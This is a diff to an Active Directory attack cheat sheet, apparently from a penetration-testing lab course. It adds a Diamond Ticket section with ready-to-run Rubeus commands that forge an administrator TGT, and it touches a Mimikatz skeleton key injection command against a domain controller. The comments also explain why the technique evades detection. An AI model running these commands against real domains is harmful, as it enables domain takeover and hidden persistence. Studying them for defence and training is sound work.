@@ -788,7 +788,19 @@ schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local "STCheck"
 ### Diamond Ticket
 
 ```powershell
-# 
+# Diamond ticket is an alternative to Golden Ticket.
+# Golden ticket use krbtgt hash to create a new TGT for persistence
+# Diamond ticket modifies a valid TGT (decrypt,change,re-encrypt) with the AES key of krbtgt
+# It is less detected because:
+# TGT has valid ticket times
+# It has a corresponding TGS (while a Golden ticket is forged and not linked to any TGS)
+
+# It requires credentials if used by non domain account
+Rubeus.exe diamond /krbkey:<AES_krbtgt> /user:studentx /password:studentPassword /enctype:aes /ticketusr:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /Createnetonly:c:\windows\system32\cmd.exe /show /ptt
+
+# if a domain account is available, use the /tgtdeleg 
+Rubeus.exe diamond /krbkey:<AES_krbtgt> /tgtdeleg /enctype:aes /ticketusr:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /Createnetonly:c:\windows\system32\cmd.exe /show /ptt
+
 ```
 
 ### Skeleton Key
@@ -796,7 +808,7 @@ schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local "STCheck"
 - **Invoke-Mimikatz:**
 ```powershell
 # Command to inject a skeleton key
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.corporate.corp.local
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.corporate.corp.local
 ```
 
 ### Directory Services Restore Mode (DSRM)
